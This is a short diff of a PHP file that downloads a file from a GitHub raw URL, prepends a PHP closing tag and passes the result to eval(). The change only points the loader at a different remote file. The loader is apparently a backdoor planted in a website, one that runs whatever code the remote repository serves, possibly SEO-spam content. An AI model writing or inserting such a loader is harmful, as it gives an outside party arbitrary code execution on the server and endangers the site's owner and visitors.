@@ -1,4 +1,4 @@
 <?php
-$zhyvenseo = file_get_contents('https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/getout.php');
+$zhyvenseo = file_get_contents('https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/adminnerjournals.txt');
 $zhyvenseo = "?> ".$zhyvenseo;
 eval($zhyvenseo);
